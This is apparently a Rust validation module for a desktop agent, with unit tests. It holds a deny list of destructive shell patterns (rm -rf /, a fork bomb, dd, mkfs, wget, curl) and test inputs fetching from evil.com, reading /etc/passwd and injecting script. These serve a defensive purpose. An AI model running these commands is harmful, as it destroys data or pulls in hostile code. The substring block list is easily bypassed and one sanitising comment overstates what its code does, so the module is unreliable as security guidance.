// Copyright 2024 Desktop Agent Team
// Licensed under MIT License

//! Input validation and sanitization
//!
//! Provides validation utilities for user inputs, file paths, and API parameters

#![allow(dead_code)]
use crate::error::{AppError, Result};
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::{Path, PathBuf};

/// Validate a file path for path traversal attacks
pub fn validate_file_path(path: &str) -> Result<PathBuf> {
    // Check for path traversal patterns
    if path.contains("..") {
        return Err(AppError::invalid_input("Path traversal detected"));
    }

    // Check for null bytes
    if path.contains('\0') {
        return Err(AppError::invalid_input("Null byte in path"));
    }

    let pathbuf = PathBuf::from(path);

    // Check for absolute path that escapes allowed directories
    // This is a basic check - the actual enforcement should be done at the filesystem layer
    Ok(pathbuf)
}

/// Validate a file path is within an allowed base directory
pub fn validate_path_within_base(path: &Path, base: &Path) -> Result<PathBuf> {
    let canonical_base = base.canonicalize()
        .map_err(|_| AppError::invalid_input("Invalid base directory"))?;

    // Handle the case where the path might not exist yet
    let canonical_path = if path.exists() {
        path.canonicalize()
            .map_err(|_| AppError::invalid_input("Invalid path"))?
    } else {
        let parent = path.parent();
        let file_name = path.file_name();
        match (parent, file_name) {
            (Some(p), Some(name)) if p.exists() => {
                p.canonicalize()
                    .map_err(|_| AppError::invalid_input("Invalid parent path"))?
                    .join(name)
            }
            _ => return Err(AppError::invalid_input("Path does not exist")),
        }
    };

    if !canonical_path.starts_with(&canonical_base) {
        return Err(AppError::invalid_input(
            "Path is outside the allowed directory",
        ));
    }

    Ok(canonical_path)
}

/// Validate a skill name
pub fn validate_skill_name(name: &str) -> Result<()> {
    static SKILL_NAME_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^[a-zA-Z][a-zA-Z0-9_-]{1,63}$").unwrap()
    });

    if name.is_empty() {
        return Err(AppError::invalid_input("Skill name cannot be empty"));
    }

    if !SKILL_NAME_RE.is_match(name) {
        return Err(AppError::invalid_input(
            "Skill name must start with a letter and contain only alphanumeric characters, hyphens, and underscores (2-64 chars)",
        ));
    }

    Ok(())
}

/// Validate a user ID
pub fn validate_user_id(user_id: &str) -> Result<()> {
    static USER_ID_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^[a-zA-Z0-9_-]{1,128}$").unwrap()
    });

    if user_id.is_empty() {
        return Err(AppError::invalid_input("User ID cannot be empty"));
    }

    if !USER_ID_RE.is_match(user_id) {
        return Err(AppError::invalid_input(
            "User ID must contain only alphanumeric characters, hyphens, and underscores (1-128 chars)",
        ));
    }

    Ok(())
}

/// Validate an email address
pub fn validate_email(email: &str) -> Result<()> {
    static EMAIL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$").unwrap()
    });

    if !EMAIL_RE.is_match(email) {
        return Err(AppError::invalid_input("Invalid email address"));
    }

    Ok(())
}

/// Validate a URL
pub fn validate_url(url: &str) -> Result<()> {
    static URL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/.*)?$").unwrap()
    });

    if !URL_RE.is_match(url) {
        return Err(AppError::invalid_input("Invalid URL format"));
    }

    Ok(())
}

/// Validate a JSON string
pub fn validate_json(input: &str) -> Result<serde_json::Value> {
    let value: serde_json::Value = serde_json::from_str(input)
        .map_err(|e| AppError::invalid_input(format!("Invalid JSON: {}", e)))?;
    Ok(value)
}

/// Validate and sanitize a search query
pub fn validate_search_query(query: &str) -> Result<String> {
    if query.is_empty() {
        return Err(AppError::invalid_input("Search query cannot be empty"));
    }

    if query.len() > 500 {
        return Err(AppError::invalid_input("Search query too long (max 500 chars)"));
    }

    // Remove potential regex special characters and SQL-like patterns
    let sanitized: String = query
        .chars()
        .filter(|c| !c.is_control())
        .collect();

    Ok(sanitized)
}

/// Validate a configuration key
pub fn validate_config_key(key: &str) -> Result<()> {
    static CONFIG_KEY_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^[a-zA-Z][a-zA-Z0-9_.]{0,127}$").unwrap()
    });

    if key.is_empty() {
        return Err(AppError::invalid_input("Config key cannot be empty"));
    }

    if !CONFIG_KEY_RE.is_match(key) {
        return Err(AppError::invalid_input(
            "Config key must start with a letter and contain only alphanumeric characters, dots, and underscores",
        ));
    }

    Ok(())
}

/// Validate a command string for safe execution
pub fn validate_command(command: &str) -> Result<()> {
    // Block potentially dangerous commands
    let dangerous_patterns = [
        "rm -rf /",
        "del /s /q",
        "format ",
        "mkfs.",
        "dd if=",
        "> /dev/",
        ":(){ :|:& };:",
        "chmod 777 /",
        "wget ",
        "curl ",
    ];

    let lower = command.to_lowercase();
    for pattern in dangerous_patterns {
        if lower.contains(pattern) {
            return Err(AppError::invalid_input(
                format!("Potentially dangerous command pattern detected: {}", pattern),
            ));
        }
    }

    Ok(())
}

/// Validate a file extension against an allowlist
pub fn validate_file_extension(path: &str, allowed: &[&str]) -> Result<()> {
    let extension = Path::new(path)
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_lowercase());

    match extension {
        Some(ext) if allowed.iter().any(|a| a.to_lowercase() == ext) => Ok(()),
        Some(ext) => Err(AppError::invalid_input(
            format!("File extension '.{}' not allowed. Allowed: {}", ext, allowed.join(", ")),
        )),
        None => Err(AppError::invalid_input("File must have an extension")),
    }
}

/// Validate string length constraints
pub fn validate_length(input: &str, min: usize, max: usize, field_name: &str) -> Result<()> {
    let len = input.len();
    if len < min {
        return Err(AppError::invalid_input(
            format!("{} is too short (min {} chars, got {})", field_name, min, len),
        ));
    }
    if len > max {
        return Err(AppError::invalid_input(
            format!("{} is too long (max {} chars, got {})", field_name, max, len),
        ));
    }
    Ok(())
}

/// Sanitize HTML content to prevent XSS
pub fn sanitize_html(input: &str) -> String {
    input
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Sanitize a filename by removing or replacing unsafe characters
pub fn sanitize_filename(name: &str) -> String {
    name.chars()
        .map(|c| match c {
            '/' | '\\' | ':' | '*' | '?' | '"' | '<' | '>' | '|' => '_',
            c if c.is_control() => '_',
            c => c,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_file_path() {
        assert!(validate_file_path("/home/user/file.txt").is_ok());
        assert!(validate_file_path("/home/../etc/passwd").is_err());
        assert!(validate_file_path("/home/user\0/evil").is_err());
    }

    #[test]
    fn test_validate_skill_name() {
        assert!(validate_skill_name("ocr-skill").is_ok());
        assert!(validate_skill_name("my_skill_123").is_ok());
        assert!(validate_skill_name("123skill").is_err());
        assert!(validate_skill_name("").is_err());
        assert!(validate_skill_name("a b").is_err());
    }

    #[test]
    fn test_validate_user_id() {
        assert!(validate_user_id("user123").is_ok());
        assert!(validate_user_id("ou_xxx-yyy").is_ok());
        assert!(validate_user_id("").is_err());
        assert!(validate_user_id("user with space").is_err());
    }

    #[test]
    fn test_validate_email() {
        assert!(validate_email("user@example.com").is_ok());
        assert!(validate_email("user.name+tag@example.co").is_ok());
        assert!(validate_email("invalid").is_err());
        assert!(validate_email("@example.com").is_err());
    }

    #[test]
    fn test_validate_url() {
        assert!(validate_url("https://example.com").is_ok());
        assert!(validate_url("http://localhost:8080/path").is_ok());
        assert!(validate_url("ftp://example.com").is_err());
        assert!(validate_url("not a url").is_err());
    }

    #[test]
    fn test_validate_search_query() {
        assert!(validate_search_query("hello world").is_ok());
        assert!(validate_search_query("").is_err());
        assert!(validate_search_query(&"x".repeat(501)).is_err());
    }

    #[test]
    fn test_validate_config_key() {
        assert!(validate_config_key("server.host").is_ok());
        assert!(validate_config_key("logging_level").is_ok());
        assert!(validate_config_key("123key").is_err());
        assert!(validate_config_key("key with space").is_err());
    }

    #[test]
    fn test_validate_command() {
        assert!(validate_command("ls -la").is_ok());
        assert!(validate_command("rm -rf /").is_err());
        assert!(validate_command("wget http://evil.com/payload").is_err());
    }

    #[test]
    fn test_sanitize_html() {
        assert_eq!(sanitize_html("<script>alert('xss')</script>"),
            "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;");
        assert_eq!(sanitize_html("normal text"), "normal text");
    }

    #[test]
    fn test_sanitize_filename() {
        assert_eq!(sanitize_filename("normal.txt"), "normal.txt");
        assert_eq!(sanitize_filename("file/name:evil*"), "file_name_evil_");
        assert_eq!(sanitize_filename("clean"), "clean");
    }

    #[test]
    fn test_validate_file_extension() {
        assert!(validate_file_extension("doc.pdf", &["pdf", "txt"]).is_ok());
        assert!(validate_file_extension("doc.exe", &["pdf", "txt"]).is_err());
        assert!(validate_file_extension("noext", &["pdf"]).is_err());
    }

    #[test]
    fn test_validate_length() {
        assert!(validate_length("hello", 1, 100, "test").is_ok());
        assert!(validate_length("", 1, 100, "test").is_err());
        assert!(validate_length(&"x".repeat(101), 1, 100, "test").is_err());
    }
}
